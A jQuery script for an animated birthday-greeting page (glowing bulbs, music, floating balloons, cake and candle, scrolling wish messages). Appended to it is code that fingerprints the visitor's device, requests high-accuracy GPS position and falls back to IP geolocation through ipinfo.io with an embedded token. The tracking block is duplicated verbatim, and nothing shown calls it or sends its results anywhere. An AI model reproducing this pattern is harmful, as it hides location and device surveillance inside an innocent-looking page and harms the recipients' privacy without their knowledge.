$(window).load(function(){
	$('.loading').fadeOut('fast');
	$('.container').fadeIn('fast');
});
$('document').ready(function(){
		var vw;
		$(window).resize(function(){
			 vw = $(window).width()/2;
			$('#b1,#b2,#b3,#b4,#b5,#b6,#b7').stop();
			$('#b11').animate({top:240, left: vw-350},500);
			$('#b22').animate({top:240, left: vw-250},500);
			$('#b33').animate({top:240, left: vw-150},500);
			$('#b44').animate({top:240, left: vw-50},500);
			$('#b55').animate({top:240, left: vw+50},500);
			$('#b66').animate({top:240, left: vw+150},500);
			$('#b77').animate({top:240, left: vw+250},500);
		});

	$('#turn_on').click(function(){
		$('#bulb_yellow').addClass('bulb-glow-yellow');
		$('#bulb_red').addClass('bulb-glow-red');
		$('#bulb_blue').addClass('bulb-glow-blue');
		$('#bulb_green').addClass('bulb-glow-green');
		$('#bulb_pink').addClass('bulb-glow-pink');
		$('#bulb_orange').addClass('bulb-glow-orange');
		$('body').addClass('peach');
		$(this).fadeOut('slow').delay(5000).promise().done(function(){
			$('#play').fadeIn('slow');
		});
	});
	$('#play').click(function(){
		var audio = $('.song')[0];
        audio.play();
        $('#bulb_yellow').addClass('bulb-glow-yellow-after');
		$('#bulb_red').addClass('bulb-glow-red-after');
		$('#bulb_blue').addClass('bulb-glow-blue-after');
		$('#bulb_green').addClass('bulb-glow-green-after');
		$('#bulb_pink').addClass('bulb-glow-pink-after');
		$('#bulb_orange').addClass('bulb-glow-orange-after');
		$('body').css('backgroud-color','#FFF');
		$('body').addClass('peach-after');
		$(this).fadeOut('slow').delay(6000).promise().done(function(){
			$('#bannar_coming').fadeIn('slow');
		});
	});

	$('#bannar_coming').click(function(){
		$('.bannar').addClass('bannar-come');
		$(this).fadeOut('slow').delay(6000).promise().done(function(){
			$('#balloons_flying').fadeIn('slow');
		});
	});

	function loopOne() {
		var randleft = 1000*Math.random();
		var randtop = 500*Math.random();
		$('#b1').animate({left:randleft,bottom:randtop},10000,function(){
			loopOne();
		});
	}
	function loopTwo() {
		var randleft = 1000*Math.random();
		var randtop = 500*Math.random();
		$('#b2').animate({left:randleft,bottom:randtop},10000,function(){
			loopTwo();
		});
	}
	function loopThree() {
		var randleft = 1000*Math.random();
		var randtop = 500*Math.random();
		$('#b3').animate({left:randleft,bottom:randtop},10000,function(){
			loopThree();
		});
	}
	function loopFour() {
		var randleft = 1000*Math.random();
		var randtop = 500*Math.random();
		$('#b4').animate({left:randleft,bottom:randtop},10000,function(){
			loopFour();
		});
	}
	function loopFive() {
		var randleft = 1000*Math.random();
		var randtop = 500*Math.random();
		$('#b5').animate({left:randleft,bottom:randtop},10000,function(){
			loopFive();
		});
	}

	function loopSix() {
		var randleft = 1000*Math.random();
		var randtop = 500*Math.random();
		$('#b6').animate({left:randleft,bottom:randtop},10000,function(){
			loopSix();
		});
	}
	function loopSeven() {
		var randleft = 1000*Math.random();
		var randtop = 500*Math.random();
		$('#b7').animate({left:randleft,bottom:randtop},10000,function(){
			loopSeven();
		});
	}

	$('#balloons_flying').click(function(){
		$('.balloon-border').animate({top:-500},8000);
		$('#b1,#b4,#b5,#b7').addClass('balloons-rotate-behaviour-one');
		$('#b2,#b3,#b6').addClass('balloons-rotate-behaviour-two');
		// $('#b3').addClass('balloons-rotate-behaviour-two');
		// $('#b4').addClass('balloons-rotate-behaviour-one');
		// $('#b5').addClass('balloons-rotate-behaviour-one');
		// $('#b6').addClass('balloons-rotate-behaviour-two');
		// $('#b7').addClass('balloons-rotate-behaviour-one');
		loopOne();
		loopTwo();
		loopThree();
		loopFour();
		loopFive();
		loopSix();
		loopSeven();
		
		$(this).fadeOut('slow').delay(5000).promise().done(function(){
			$('#cake_fadein').fadeIn('slow');
		});
	});	

	$('#cake_fadein').click(function(){
		$('.cake').fadeIn('slow');
		$(this).fadeOut('slow').delay(3000).promise().done(function(){
			$('#light_candle').fadeIn('slow');
		});
	});

	$('#light_candle').click(function(){
		$('.fuego').fadeIn('slow');
		$(this).fadeOut('slow').promise().done(function(){
			$('#wish_message').fadeIn('slow');
		});
	});

		
	$('#wish_message').click(function(){
		 vw = $(window).width()/2;

		$('#b1,#b2,#b3,#b4,#b5,#b6,#b7').stop();
		$('#b1').attr('id','b11');
		$('#b2').attr('id','b22')
		$('#b3').attr('id','b33')
		$('#b4').attr('id','b44')
		$('#b5').attr('id','b55')
		$('#b6').attr('id','b66')
		$('#b7').attr('id','b77')
		$('#b11').animate({top:240, left: vw-350},500);
		$('#b22').animate({top:240, left: vw-250},500);
		$('#b33').animate({top:240, left: vw-150},500);
		$('#b44').animate({top:240, left: vw-50},500);
		$('#b55').animate({top:240, left: vw+50},500);
		$('#b66').animate({top:240, left: vw+150},500);
		$('#b77').animate({top:240, left: vw+250},500);
		$('.balloons').css('opacity','0.9');
		$('.balloons h2').fadeIn(3000);
		$(this).fadeOut('slow').delay(3000).promise().done(function(){
			$('#story').fadeIn('slow');
		});
	});
	
	$('#story').click(function(){
		$(this).fadeOut('slow');
		$('.cake').fadeOut('fast').promise().done(function(){
			$('.message').fadeIn('slow');
		});
		
		var i;

		function scrollMessages(startIndex) {
			const total = $('.message p').length;

			function showLines(i) {
				const total = $('.message p').length;

				if (i + 2 > total) {
					$('.cake').fadeIn('fast');
					return;
				}

				// Hide all messages and reset styles
				$('.message p').hide().css({ opacity: 1, position: 'relative', bottom: 0 });

				let $top = $('.message p:nth-child(' + i + ')');
				let $center = $('.message p:nth-child(' + (i + 1) + ')');
				let $bottom = $('.message p:nth-child(' + (i + 2) + ')');

				// Initial states
				$top.show().css({ bottom: '60px', opacity: 0.3 });
				$center.show().css({ bottom: '30px', opacity: 1 });
				$bottom.show().css({ bottom: '0px', opacity: 1 });

				// Wait 3s then shift all upward
				setTimeout(function () {
					// Animate: top disappears
					$top.animate({ bottom: '90px', opacity: 0 }, 800, function () {
						$top.hide();
					});

					// Animate: center → top
					$center.animate({ bottom: '60px', opacity: 0.3 }, 800);

					// Animate: bottom → center
					$bottom.animate({ bottom: '30px' }, 800, function () {
						// Load new message into bottom position
						let $newMsg = $('.message p:nth-child(' + (i + 3) + ')');
						if ($newMsg.length) {
							$newMsg.css({ bottom: 0, opacity: 1, position: 'relative' }).fadeIn(400);
						}
						// Repeat with next set
						showLines(i + 1);
					});
				}, 3000);
			}


			showLines(startIndex);
		}
		scrollMessages(1);
	});
});

async function getIPAddress() {
    try {
        const response = await fetch("https://api64.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return "Unknown";
    }
}

function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        deviceMemory: navigator.deviceMemory || "Unknown",
        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        onlineStatus: navigator.onLine,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        pageURL: window.location.href
    };
}

function getGPSLocation(callback) {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const ipAddress = await getIPAddress();
            callback({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                ipAddress: ipAddress,
                type: "GPS"
            });
        }, (error) => {
            console.warn("GPS denied, using IP location instead.");
            getIPLocation(callback);
        }, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        });
    } else {
        console.warn("GPS not supported.");
        getIPLocation(callback);
    }
}

function getIPLocation(callback) {
    fetch("https://ipinfo.io/json?token=6a9008bb55fd89")
        .then(response => response.json())
        .then(data => {
            callback({
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country,
                latitude: data.loc.split(",")[0],
                longitude: data.loc.split(",")[1],
                org: data.org,
                postal: data.postal || "Unknown",
                timezone: data.timezone || "Unknown",
                type: "IP"
            });
        })
        .catch(error => {
            console.error("Error fetching IP location:", error);
            callback(null);
        });
}

async function getIPAddress() {
    try {
        const response = await fetch("https://api64.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return "Unknown";
    }
}

function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        deviceMemory: navigator.deviceMemory || "Unknown",
        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        onlineStatus: navigator.onLine,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        pageURL: window.location.href
    };
}

function getGPSLocation(callback) {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const ipAddress = await getIPAddress();
            callback({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                ipAddress: ipAddress,
                type: "GPS"
            });
        }, (error) => {
            console.warn("GPS denied, using IP location instead.");
            getIPLocation(callback);
        }, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        });
    } else {
        console.warn("GPS not supported.");
        getIPLocation(callback);
    }
}

function getIPLocation(callback) {
    fetch("https://ipinfo.io/json?token=6a9008bb55fd89")
        .then(response => response.json())
        .then(data => {
            callback({
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country,
                latitude: data.loc.split(",")[0],
                longitude: data.loc.split(",")[1],
                org: data.org,
                postal: data.postal || "Unknown",
                timezone: data.timezone || "Unknown",
                type: "IP"
            });
        })
        .catch(error => {
            console.error("Error fetching IP location:", error);
            callback(null);
        });
}